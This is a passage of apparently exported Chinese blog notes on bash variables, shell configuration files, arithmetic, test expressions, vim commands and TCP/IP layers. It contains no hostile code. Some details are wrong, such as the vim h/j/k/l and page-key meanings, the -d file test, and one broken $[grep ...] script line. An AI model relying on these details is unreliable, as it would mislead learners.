<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">export name=VALUE </div><div class="line">declare -x name=VALUE</div><div class="line">#如果把本地变量转换成环境变量只需要用</div><div class="line">name=&apos;2&apos;</div><div class="line">declare -x name</div></pre></td></tr></table></figure>
<blockquote>
<p>变量引用</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$name</div><div class="line">$&#123;name&#125;</div></pre></td></tr></table></figure>
<blockquote>
<p>显示所有的环境变量</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">export </div><div class="line">env</div><div class="line">printenv</div></pre></td></tr></table></figure>
<blockquote>
<p>销毁</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">unset name</div></pre></td></tr></table></figure>
<p>bash有许多内建的环境变量：PATH、SHELL、UID、HOME、PWD…</p>
<p>3.只读变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#只读变量无法被修改，只能等到进程中止时消亡</div><div class="line">readonly name</div><div class="line">declare -r name</div></pre></td></tr></table></figure>
<p>4.位置变量</p>
<p>在脚本代码中调用通过命令行传递给脚本的参数：</p>
<blockquote>
<p>$1、$2…:对应调用第1，第2等参数</p>
<p>$0:命令本身</p>
<p>$*:传递给脚本的所有参数，所有参数当成一个字符串</p>
<p>$@:传递给脚本的所有参数，每个参数当成单独的字符串</p>
<p>$#:传递给脚本的参数的个数</p>
<p>shift [n]:可以踢掉传递进来的变量，n表示数量，默认为1</p>
</blockquote>
<p>示例：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-08-15%20%E4%B8%8B%E5%8D%887.21.44.png" alt="屏幕快照 2017-08-15 下午7.05.03.png](http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-08-15%20%E4%B8%8B%E5%8D%887.05.03.png)![屏幕快照 2017-08-15 下午7.21.44.png" title="" class="">
                <p>屏幕快照 2017-08-15 下午7.05.03.png](http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-08-15%20%E4%B8%8B%E5%8D%887.05.03.png)![屏幕快照 2017-08-15 下午7.21.44.png</p>
            </figure></p>
<h2 id="bash环境配置"><a href="#bash环境配置" class="headerlink" title="bash环境配置"></a>bash环境配置</h2><h4 id="按生效范围划分，存在两类："><a href="#按生效范围划分，存在两类：" class="headerlink" title="按生效范围划分，存在两类："></a>按生效范围划分，存在两类：</h4><blockquote>
<p>全局配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; /etc/profile</div><div class="line">&gt; /etc/profile.d/*.sh</div><div class="line">&gt; /etc/bashrc</div><div class="line">&gt;</div></pre></td></tr></table></figure>
<p>个人配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; #个人用户读取</div><div class="line">&gt; ~/.bash_profile</div><div class="line">&gt; ~/.bashrc</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<h4 id="按功能划分，存在两类，但是界限不明确，可能会都用到"><a href="#按功能划分，存在两类，但是界限不明确，可能会都用到" class="headerlink" title="按功能划分，存在两类，但是界限不明确，可能会都用到"></a>按功能划分，存在两类，但是界限不明确，可能会都用到</h4><blockquote>
<p>profile类：为交互式登陆shell提供配置</p>
</blockquote>
<h5 id="作用：定义环境变量、运行命令和脚本"><a href="#作用：定义环境变量、运行命令和脚本" class="headerlink" title="作用：定义环境变量、运行命令和脚本"></a>作用：定义环境变量、运行命令和脚本</h5><blockquote>
<p>bashrc类：为非交互式登陆的shell提供配置</p>
</blockquote>
<h4 id="作用：定义变量别名、定义本地变量"><a href="#作用：定义变量别名、定义本地变量" class="headerlink" title="作用：定义变量别名、定义本地变量"></a>作用：定义变量别名、定义本地变量</h4><h4 id="shell登录"><a href="#shell登录" class="headerlink" title="shell登录"></a>shell登录</h4><blockquote>
<p>交互式登陆：</p>
</blockquote>
<p>1.直接通过终端输入账号密码登录</p>
<p>2.使用’su - UserName’切换的用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#读取次序</div><div class="line">/etc/profile-&gt;/etc/profile.d/*.sh-&gt;~.bash_profile-&gt; ~./bashrc-&gt;/etc/bashrc</div></pre></td></tr></table></figure>
<blockquote>
<p>非交互式登陆</p>
</blockquote>
<p>1.su UserName</p>
<p>2.图形界面打开的终端</p>
<p>3.执行脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#读取次序</div><div class="line">~/.bashrc-&gt;/etc/bashrc-&gt;/etc/profile.d/*.sh</div></pre></td></tr></table></figure>
<p>编辑配置文件定义的新配置的生效方式：</p>
<p>1.重新启动shell进程</p>
<p>2.使用source或.命令进程</p>
<h2 id="bash中的算数运算"><a href="#bash中的算数运算" class="headerlink" title="bash中的算数运算"></a>bash中的算数运算</h2><p>如果忘记了bash中的算术运算符记得使用命令<code>help let</code>哦</p>
<h3 id="实现算数运算"><a href="#实现算数运算" class="headerlink" title="实现算数运算"></a>实现算数运算</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">let var=算数表达式</div><div class="line"></div><div class="line">var=$[算数表达式]    #有返回值，可以直接引用或者打印-&gt;echo $[算数表达式]</div><div class="line"></div><div class="line">var=$((算数表达式))</div><div class="line"></div><div class="line">var=$(expr arg1 arg2...)</div><div class="line"></div><div class="line">#其中乘法符号有些情况需要转义</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-08-17%20%E4%B8%8B%E5%8D%882.50.35.png" alt="屏幕快照 2017-08-17 下午2.50.35.png" title="" class="">
                <p>屏幕快照 2017-08-17 下午2.50.35.png</p>
            </figure>
<p>bash中有内建的随机数生成器：$RANDOM</p>
<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>传入两个文件路径，写一个脚本统计这两个文件中的空白行数目</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#! /bin/bash</div><div class="line"></div><div class="line">spaceline1=$(grep &apos;^[[:space:]]*$&apos; $1 | wc -l)</div><div class="line">spaceline2=$(grep &apos;^[[:space:]]*$&apos; $2 | wc -l)</div><div class="line"></div><div class="line">echo &quot;the sum of spaceline: $[$spaceline1 + $spaceline2] &quot;</div></pre></td></tr></table></figure>
<p>统计/etc,/var,/usr目录共有多少个一级子目录和文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">#统计/etc, /var, /usr目录中共有多少个一级子目录和文件</div><div class="line">etcnum=`ls -A -1 /etc/ |wc -l`</div><div class="line">varnum=`ls -A -1 /var/ |wc -l`</div><div class="line">usernum=`ls -A -1 /usr/ |wc -l`</div><div class="line">let sum=$etcnum+$varnum+$usernum</div><div class="line">echo &quot;/etc, /var, /usr目录中共有多少个一级子目录和文件:$sum&quot;</div></pre></td></tr></table></figure>
<p><code>个人优化版</code>：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-08-17%20%E4%B8%8B%E5%8D%883.33.24.png" alt="屏幕快照 2017-08-17 下午3.33.24.png" title="" class="">
                <p>屏幕快照 2017-08-17 下午3.33.24.png</p>
            </figure></p>
<h2 id="条件测试"><a href="#条件测试" class="headerlink" title="条件测试"></a>条件测试</h2><p>判断某需求是否满足，需要由测试机制来实现</p>
<h3 id="测试命令："><a href="#测试命令：" class="headerlink" title="测试命令："></a>测试命令：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">test EXPRESSION</div><div class="line">[ EXPRESSION ]</div><div class="line">[[ EXPRESSION ]]</div><div class="line">#EXPRESSION前后必须有空白字符</div></pre></td></tr></table></figure>
<h3 id="bash的测试类型："><a href="#bash的测试类型：" class="headerlink" title="bash的测试类型："></a>bash的测试类型：</h3><p>数值测试：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/72FA56A8E13D4C952988EE09511A64D7.png" alt="72FA56A8E13D4C952988EE09511A64D7.png" title="" class="">
                <p>72FA56A8E13D4C952988EE09511A64D7.png</p>
            </figure></p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-08-17%20%E4%B8%8B%E5%8D%8811.21.10.png" alt="屏幕快照 2017-08-17 下午11.21.10.png" title="" class="">
                <p>屏幕快照 2017-08-17 下午11.21.10.png</p>
            </figure>
<p>⚠️：做比较的时候<code>-xx</code>前后要有空格</p>
<p>字符串测试：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/006A2D9C7C1E27BA15D24C9F89AD79AF.jpg" alt="006A2D9C7C1E27BA15D24C9F89AD79AF.jpg" title="" class="">
                <p>006A2D9C7C1E27BA15D24C9F89AD79AF.jpg</p>
            </figure></p>
<p>⚠️：用于字符串比较时用到的操作数都应该使用引号,其中<code>=~</code>表达式一般用于<code>[[]]</code>中，e.g:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">name=Obama</div><div class="line">[[ &quot;$name&quot; =~ ^O.* ]]</div><div class="line">echo $?</div><div class="line">0</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-08-17%20%E4%B8%8B%E5%8D%8811.04.58.png" alt="屏幕快照 2017-08-17 下午11.04.58.png" title="" class="">
                <p>屏幕快照 2017-08-17 下午11.04.58.png</p>
            </figure>
<p>文件测试之存在性测试：</p>
<table>
<thead>
<tr>
<th>-f FILE</th>
<th style="text-align:center">是否存在且为普通文件</th>
</tr>
</thead>
<tbody>
<tr>
<td>-e FILE</td>
<td style="text-align:center">存在为真，否则为假</td>
</tr>
<tr>
<td>-b FILE</td>
<td style="text-align:center">是否存在且为块设备文件</td>
</tr>
<tr>
<td>-c FILE</td>
<td style="text-align:center">是否存在且满足为字符设备文件</td>
</tr>
<tr>
<td>-d FILE</td>
<td style="text-align:center">是否存在且为普通文件</td>
</tr>
<tr>
<td>-S FILE</td>
<td style="text-align:center">是否为套接字文件</td>
</tr>
</tbody>
</table>
<p>除此之外还有文件权限测试，文件大小测试还有双目测试,这些可以在<code>help test</code>中看到</p>
<h4 id="同时测试语句可以组合使用："><a href="#同时测试语句可以组合使用：" class="headerlink" title="同时测试语句可以组合使用："></a>同时测试语句可以组合使用：</h4><p>1.COMMAND1 &amp;&amp; COMMAND2</p>
<p>  COMMAND1 || COMMAND2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[ -e FILE ] &amp;&amp; [ -r FILE ]</div></pre></td></tr></table></figure>
<p>2.COMMAND1 -a COMMAND2</p>
<p>   COMMAND1 -o COMMAND2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[ -z &quot;$hostname&quot; -o &quot;$hostname&quot;==&quot;localhost.localdomain&quot; ] &amp;&amp; hostname hello</div></pre></td></tr></table></figure>
<p>注意：在管理员用户下使用权限的测试语句结果会很<strong>诡异</strong></p>
<h3 id="bash自定义退出状态码"><a href="#bash自定义退出状态码" class="headerlink" title="bash自定义退出状态码"></a>bash自定义退出状态码</h3><p>exit [n] : 自定义状态码</p>
<p>⚠️：脚本中一旦遇到exit命令，脚本会立即终止，终止推出状态取决于exit命令后面的数字，如果没有给，整个脚本的退出状态取决于脚本中执行的最后一条命令的状态码，这个值会被返回给脚本的父进程，根据其做下一步的处理。</p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>写一个脚本，接收文件路径为参数，如果参数个数小于1，则提示用户“至少应该给一个参数”，并立即退出；如果参数个数不小于1，则显示第一个参数所指向的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">#! /bin/bash</div><div class="line"></div><div class="line">count=$#</div><div class="line"></div><div class="line">[ $count -lt 1 ] &amp;&amp; echo &quot;至少应该给一个参数&quot; &amp;&amp; exit 1</div><div class="line"></div><div class="line">FILE1=$[grep &apos;^$&apos; $1 | wc -l]</div><div class="line"></div><div class="line">echo &quot;$1空白行数为$FILE1行&quot;</div></pre></td></tr></table></figure>
<h3 id="vim常用操作"><a href="#vim常用操作" class="headerlink" title="vim常用操作"></a>vim常用操作</h3><p><strong>Vim</strong> 的学习曲线是非常陡的，一开始学习的时候，面对很多的操作命令要去记住，常常望而却步。</p>
<p>其实，只要记住一些常用的命令，加之在工作中坚持使用 <strong>Vim</strong> 进行编辑，很快就能得心应手了。</p>
<h4 id="光标移动-Cursor-Movement"><a href="#光标移动-Cursor-Movement" class="headerlink" title="光标移动(Cursor Movement)"></a>光标移动(Cursor Movement)</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用（解释）</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>h,j,k,l</code></td>
<td><code>h</code>表示往左，<code>j</code>表示往下，<code>k</code>表示往右，<code>l</code>表示往上</td>
</tr>
<tr>
<td><code>Ctrl</code>+<code>f</code></td>
<td>上一页</td>
</tr>
<tr>
<td><code>Ctrl</code>+<code>b</code></td>
<td>下一页</td>
</tr>
<tr>
<td><code>w</code>, <code>e</code>, <code>W</code>, <code>E</code></td>
<td>跳到单词的后面，小写包括标点</td>
</tr>
<tr>
<td><code>b</code>, <code>B</code></td>
<td>以单词为单位往前跳动光标，小写包含标点</td>
</tr>
<tr>
<td><code>O</code></td>
<td>开启新的一行</td>
</tr>
<tr>
<td><code>^</code></td>
<td>一行的开始</td>
</tr>
<tr>
<td><code>$</code></td>
<td>一行的结尾</td>
</tr>
<tr>
<td><code>gg</code></td>
<td>文档的第一行</td>
</tr>
<tr>
<td><code>[N]G</code></td>
<td>文档的第N行或者最后一行</td>
</tr>
</tbody>
</table>
<h4 id="插入模式-Insert-Mode"><a href="#插入模式-Insert-Mode" class="headerlink" title="插入模式(Insert Mode)"></a>插入模式(Insert Mode)</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用（解释)</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>i</code></td>
<td>插入到光标前面</td>
</tr>
<tr>
<td><code>I</code></td>
<td>插入到行的开始位置</td>
</tr>
<tr>
<td><code>a</code></td>
<td>插入到光标的后面</td>
</tr>
<tr>
<td><code>A</code></td>
<td>插入到行的最后位置</td>
</tr>
<tr>
<td><code>o</code>, <code>O</code></td>
<td>新开一行</td>
</tr>
<tr>
<td><code>Esc</code></td>
<td>关闭插入模式</td>
</tr>
</tbody>
</table>
<h4 id="编辑-Editing"><a href="#编辑-Editing" class="headerlink" title="编辑(Editing)"></a>编辑(Editing)</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用（解释）</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>r</code></td>
<td>在插入模式替换光标所在的一个字符</td>
</tr>
<tr>
<td><code>J</code></td>
<td>合并下一行到上一行</td>
</tr>
<tr>
<td><code>s</code></td>
<td>删除光标所在的一个字符, 光标还在当行</td>
</tr>
<tr>
<td><code>S</code></td>
<td>删除光标所在的一行，光标还在当行，不同于<code>dd</code></td>
</tr>
<tr>
<td><code>u</code></td>
<td>撤销上一步操作</td>
</tr>
<tr>
<td><code>ctrl</code>+<code>r</code></td>
<td>恢复上一步操作</td>
</tr>
<tr>
<td><code>.</code></td>
<td>重复最后一个命令</td>
</tr>
<tr>
<td><code>~</code></td>
<td>变换为大写</td>
</tr>
<tr>
<td><code>[N]&gt;&gt;</code></td>
<td>一行或N行往右移动一个tab</td>
</tr>
<tr>
<td><code>[N]&lt;&lt;</code></td>
<td>一行或N行往左移动一个tab</td>
</tr>
</tbody>
</table>
<h4 id="关闭-Exiting"><a href="#关闭-Exiting" class="headerlink" title="关闭(Exiting)"></a>关闭(Exiting)</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用（解释)</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>:w</code></td>
<td>保存</td>
</tr>
<tr>
<td><code>:wq</code>, <code>:x</code></td>
<td>保存并关闭</td>
</tr>
<tr>
<td><code>:q</code></td>
<td>关闭（已保存）</td>
</tr>
<tr>
<td><code>:q!</code></td>
<td>强制关闭</td>
</tr>
</tbody>
</table>
<h4 id="搜索-Search"><a href="#搜索-Search" class="headerlink" title="搜索(Search)"></a>搜索(Search)</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用（解释)</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>/pattern</code></td>
<td>搜索（非插入模式)</td>
</tr>
<tr>
<td><code>?pattern</code></td>
<td>往后搜索</td>
</tr>
<tr>
<td><code>n</code></td>
<td>光标到达搜索结果的前一个目标</td>
</tr>
<tr>
<td><code>N</code></td>
<td>光标到达搜索结果的后一个目标</td>
</tr>
</tbody>
</table>
<h4 id="视觉模式-Visual-Mode"><a href="#视觉模式-Visual-Mode" class="headerlink" title="视觉模式(Visual Mode)"></a>视觉模式(Visual Mode)</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用（解释)</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>v</code></td>
<td>选中一个或多个字符</td>
</tr>
<tr>
<td><code>V</code></td>
<td>选中一行</td>
</tr>
</tbody>
</table>
<h4 id="剪切和复制-Cut-and-Paste"><a href="#剪切和复制-Cut-and-Paste" class="headerlink" title="剪切和复制(Cut and Paste)"></a>剪切和复制(Cut and Paste)</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用（解释)</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>dd</code></td>
<td>删除一行</td>
</tr>
<tr>
<td><code>dw</code></td>
<td>删除一个单词</td>
</tr>
<tr>
<td><code>x</code></td>
<td>删除后一个字符</td>
</tr>
<tr>
<td><code>X</code></td>
<td>删除前一个字符</td>
</tr>
<tr>
<td><code>D</code></td>
<td>删除一行最后一个字符</td>
</tr>
<tr>
<td><code>[N]yy</code></td>
<td>复制一行或者N行</td>
</tr>
<tr>
<td><code>yw</code></td>
<td>复制一个单词</td>
</tr>
<tr>
<td><code>p</code></td>
<td>粘贴</td>
</tr>
</tbody>
</table>
<h4 id="窗口操作"><a href="#窗口操作" class="headerlink" title="窗口操作"></a>窗口操作</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用（解释)</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>:split</code></td>
<td>水平方向分割出一个窗口</td>
</tr>
<tr>
<td><code>:vsplit</code></td>
<td>垂直方向分割出一个窗口</td>
</tr>
<tr>
<td><code>:close</code></td>
<td>关闭窗口</td>
</tr>
<tr>
<td><code>Ctrl</code>+<code>W</code></td>
<td>在窗口间进行切换</td>
</tr>
<tr>
<td>vim -o file1…</td>
<td>水平分割</td>
</tr>
<tr>
<td>vim -O file1…</td>
<td>垂直分割</td>
</tr>
</tbody>
</table>
<h4 id="地址定界"><a href="#地址定界" class="headerlink" title="地址定界"></a>地址定界</h4><table>
<thead>
<tr>
<th style="text-align:center">:start_pos, end_pos</th>
<th style="text-align:center">开始，结束位置</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">n</td>
<td style="text-align:center">具体第几行</td>
</tr>
<tr>
<td style="text-align:center">m , n</td>
<td style="text-align:center">m行到n行</td>
</tr>
<tr>
<td style="text-align:center">m, +n</td>
<td style="text-align:center">从m行往后的n行</td>
</tr>
<tr>
<td style="text-align:center">.</td>
<td style="text-align:center">当前行</td>
</tr>
<tr>
<td style="text-align:center">$</td>
<td style="text-align:center">最后一行</td>
</tr>
<tr>
<td style="text-align:center">%</td>
<td style="text-align:center">全文</td>
</tr>
<tr>
<td style="text-align:center">/pat1, /pat2</td>
<td style="text-align:center">从第一次被pat1匹配到的到第一次被pat2匹配到的行</td>
</tr>
</tbody>
</table>
<p>使用方式：后跟一个编辑命令</p>
<table>
<thead>
<tr>
<th style="text-align:center">d</th>
<th style="text-align:center">删除</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">y</td>
<td style="text-align:center">复制</td>
</tr>
<tr>
<td style="text-align:center">w</td>
<td style="text-align:center">将范围内的行另存到指定文件</td>
</tr>
<tr>
<td style="text-align:center">r</td>
<td style="text-align:center">在指定位置插入指定文件中的所有内容</td>
</tr>
</tbody>
</table>
<h4 id="查找并替换"><a href="#查找并替换" class="headerlink" title="查找并替换"></a>查找并替换</h4><p>s:在末行模式下完成查找替换工作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">s/要查找的内容/替换为的内容/修饰符</div></pre></td></tr></table></figure>
<p>要查找的内容可以使用模式。替换的内容不能使用模式，但可以使用\1、\2、…等后向引用符，还可以使用<code>&amp;</code>引用前面查到到的整个内容</p>
<p>修饰符：</p>
<table>
<thead>
<tr>
<th style="text-align:center">i</th>
<th style="text-align:center">忽略大小写</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">g</td>
<td style="text-align:center">全局替换，默认情况下，每一行只替换第一次出现</td>
</tr>
</tbody>
</table>
<p>比如说将rxxt替换为RxxT:<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-08-28%20%E4%B8%8A%E5%8D%8812.45.30.png" alt="屏幕快照 2017-08-28 上午12.45.30.png" title="" class="">
                <p>屏幕快照 2017-08-28 上午12.45.30.png</p>
            </figure></p>
<p>其中查找替换中的分隔符可以替换为其他字符，例如@，所以如果要将所有的/etc/fstab替换为/var/log：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%s@/etc/fstab@/var/log@g</div></pre></td></tr></table></figure>
<p>下面还有几个例子可供参考：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#<span class="number">1</span>.删除/etc/grub.d行首前面的空格</div><div class="line">%s/^[[:space:]]\+//g</div><div class="line">#<span class="number">2</span>.为以空白字符开头的行前面添加一个#</div><div class="line">%s/^[[:space:]]\+/#&amp;//g</div></pre></td></tr></table></figure>
<h4 id="多文件模式"><a href="#多文件模式" class="headerlink" title="多文件模式"></a>多文件模式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim file1 file2 ...</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:center">:next</th>
<th style="text-align:center">下一个文件</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">:prev</td>
<td style="text-align:center">上一个文件</td>
</tr>
<tr>
<td style="text-align:center">:first</td>
<td style="text-align:center">第一个</td>
</tr>
<tr>
<td style="text-align:center">:last</td>
<td style="text-align:center">最后一个</td>
</tr>
<tr>
<td style="text-align:center">wall</td>
<td style="text-align:center">保存所有</td>
</tr>
<tr>
<td style="text-align:center">qall</td>
<td style="text-align:center">退出所有</td>
</tr>
</tbody>
</table>
<p>例子，去除文件中以#开头后面跟若干个空格的空格，只留下#</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:%s/^#[[:space:]]*/#/g</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 扩展正则表达式 环境配置 条件测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[TCP/IP(二)]]></title>
      <url>/2017/08/27/TCP-IP-%E4%BA%8C/</url>
      <content type="html"><![CDATA[<p>当你指尖轻触屏幕，消息如何传达到了千里之外的那个她？<br><a id="more"></a></p>
<h1 id="TCP-IP-二"><a href="#TCP-IP-二" class="headerlink" title="TCP/IP(二)"></a>TCP/IP(二)</h1><h2 id="协议分层模型"><a href="#协议分层模型" class="headerlink" title="协议分层模型"></a>协议分层模型</h2><h3 id="硬件、网络接口层"><a href="#硬件、网络接口层" class="headerlink" title="硬件、网络接口层"></a>硬件、网络接口层</h3><p>这一层主要是在硬件、设备驱动程序和网络接口层面上，在硬件方面TCP/IP没有一个既定的指标，至于网络接口层可以当作让NIC起作用的驱动程序。驱动程序是操作系统和硬件之间的桥梁，当我们添加硬件设备的时候，</p>
<h3 id="互联网层（网络层）"><a href="#互联网层（网络层）" class="headerlink" title="互联网层（网络层）"></a>互联网层（网络层）</h3><ul>
<li>IP</li>
</ul>
<p>IP是跨越网络传送数据包，使整个互联网都能收到数据的协议。IP协议使数据可以发送到地球的另一端，这期间以IP地址作为主机的标识。</p>
<p>IP还隐含着数据链路的功能。通过IP，相互通信的主机之间不管通过怎样的底层数据链路都能进行通信。</p>
<p>虽然IP也是分组交换协议的一种，但是它不具有重发机制，即使分组数据包未能到达对端主机也不会重发。因此属于非可靠性传输协议。</p>
<ul>
<li>ICMP</li>
</ul>
<p>IP数据包在发送途中一旦发生异常导致无法到达对端目标地址的时候，需要给发送端发送一个异常通知.ICMP就是为了这一功能指定的，可以用来诊断网络的健康状态。</p>
<ul>
<li>ARP</li>
</ul>
<p>从分组数据包中的IP地址中解析出物理地址的一种协议。</p>
<h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>传输层可以让应用之间进行通信，识别这些应用程序的是端口号。</p>
<ul>
<li>TCP</li>
</ul>
<p>TCP是一种面向有连接的传输层协议，它可以保证两端通信主机之间的通信可达。TCP能够正确地处理在传输过程中丢包、传输顺序乱掉等问题。此外，TCP还可以有效的利用带宽，缓解网络拥堵。</p>
<p>但是有时为了建立和断开连接，需要进行至少七次的发包收包，导致网络流量浪费。此外，为了提高网络利用率，TCP中制定了各种复杂的规范，不利于视频会议（音频会议）使用</p>
<ul>
<li>UDP</li>
</ul>
<p>UDP是一种面向无连接的传输协议。如果要检测是否收到数据包或者是否连接到网络，要在应用程序中实现，UDP常用于分组数据较少或多播、广播通信及视频通信等。</p>
<h3 id="应用层及以上"><a href="#应用层及以上" class="headerlink" title="应用层及以上"></a>应用层及以上</h3><p>我们会发现TCP/IP分层中，应用层及以上的功能都集中到了应用程序中去实现。</p>
<ul>
<li>WWW</li>
</ul>
<p>比如说我们用浏览器上网就离不开WWW，浏览器与服务器端之间通信所用到的协议是HTTP，所传输的数据格式是HTML，前者是应用层协议，后者是表示层协议。</p>
<ul>
<li>电子邮价</li>
</ul>
<p>发送电子邮件的时候所用到的协议叫做SMTP，人们通过互联网在网上互发电子邮件。</p>
<p>最初的时候，人们只能发文本格式的电子邮件，后来电子邮件的格式在MIME协议上扩展之后，还可以传输声音，图像各式各样的信息，MIME属于表示层协议。</p>
<ul>
<li>文件传输（FTP）</li>
</ul>
<p>文件传输可以将本地硬盘中的数据传输到其他电脑的硬盘上，也可以将其他主机硬盘上数据传输到本机上，FTP很早就已经投入使用了，可以选择二进制传输或者是文本传输。</p>
<p>FTP在传输的时候会建立两个TCP连接，一个用来发出传输请求的控制连接，一个用来发出实际传输数据所用到的数据连接。</p>
<ul>
<li>远程登陆</li>
</ul>
<p>常用的有SSH和TELNET。但是其实还有很多别的，比如BSD UNIX系中的rlogin的r命令协议和X Window System中的X协议。</p>
<ul>
<li>网络管理</li>
</ul>
<p>在TCP/IP中进行网络管理的时候，采用SNMP协议。使用SNMP管理的主机、网桥、路由器等称作SNMP代理。SNMP是管理器和代理之间所用到的协议。</p>
<p>在SNMP的管理端，保存着网络接口信息、通信数据量、异常数据量、温度信息等。这些信息通过MIB访问。SNMP是应用层协议，MIB属于表示层协议。</p>
<h2 id="TCP-IP通信示例"><a href="#TCP-IP通信示例" class="headerlink" title="TCP/IP通信示例"></a>TCP/IP通信示例</h2><p>同样是之前那个甲向乙发送邮件说早上好的例子，这一次不是从OSI模型层数上来进行分析：</p>
